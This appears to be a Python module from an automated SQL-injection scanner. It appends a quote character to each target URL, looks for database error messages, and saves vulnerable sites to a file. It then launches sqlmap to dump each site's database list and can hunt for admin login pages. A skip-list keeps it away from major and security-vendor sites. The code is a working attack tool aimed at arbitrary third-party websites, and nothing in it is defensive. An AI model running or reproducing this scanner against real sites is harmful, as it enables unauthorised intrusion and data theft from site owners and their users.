import urllib.request as req
from urllib.error import URLError, HTTPError
from termcolor import *
import docs.adminfinder
def cheaker(site,choice2):
	bad_words = ["http://cxsecurity.com", "https://cxsecurity.com", "https://bing.com", "https://msn.com", "https://microsoft.com",
				 "https://yahoo.com", "https://live.com", "https://microsofttranslator.com", "https://irongeek.com",
				 "https://tefneth-import.com", "https://hackforums.net", "https://freelancer.com",
				 "https://facebook.com", "https://mozilla.org", "https://stackoverflow.com", "https://php.net",
				 "https://wikipedia.org", "https://amazon.com", "https://4shared.com", "https://wordpress.org",
				 "https://about.com", "https://phpbuilder.com", "https://phpnuke.org", "https://linearcity.hk",
				 "https://youtube.com", "https://ptjaviergroup.com", "https://p4kurd.com", "https://tizag.com",
				 "https://discoverbing.com", "https://devshed.com", "https://ashiyane.org", "https://owasp.org",
				 "https://1923turk.com", "https://fictionbook.org", "https://silenthacker.do.am", "https://v4-team.com",
				 "https://codingforums.com", "https://tudosobrehacker.com", "https://zymic.com",
				 "https://forums.whirlpool.net.au", "https://gaza-hacker.com", "https://immortaltechnique.co.uk",
				 "https://w3schools.com", "https://phpeasystep.com", "https://mcafee.com",
				 "https://specialinterestarms.com", "https://pastesite.com", "https://pastebin.com",
				 "https://joomla.org", "https://joomla.fr", "https://sourceforge.net", "https://joesjewelry.com"]
	if site.startswith("https")==True: #you can add # before this line and the line after this line (6,7) if you want https results
		site=""
	for bad in bad_words:
		if site.startswith(bad)==True:
			site=""
	if site.endswith("/")==True:
		site=""
	if "." in site[-5:]:
		site=""
	try:
		opnurl=req.urlopen(site+"%27")
		pagescr=str(opnurl.read())
	except HTTPError as err:
		pagescr=""
		pass
	except URLError as err:
		pagescr=""
		pass
	except ValueError as err:
		pagescr=""
		pass
	
	with open("docs/err_list.txt","r+") as errors:
		for error in errors:
			error=error.replace("\n","")
			if error in pagescr:
				print(colored("    Site Vulnerable=>  ","blue")+site)
				with open("injectable_sites.txt",mode="a") as injsitesf:
					injsitesf.write(site+"%27"+"\n")
				os.system('gnome-terminal -x sh -c "sqlmap -u '+site+' --dbs"')
				if choice2 =="Y" or choice2 =="y":
					print(colored(" [Finding Admin Login] ","yellow").center(60,"-"))
					docs.adminfinder.adminfind(site)
				break
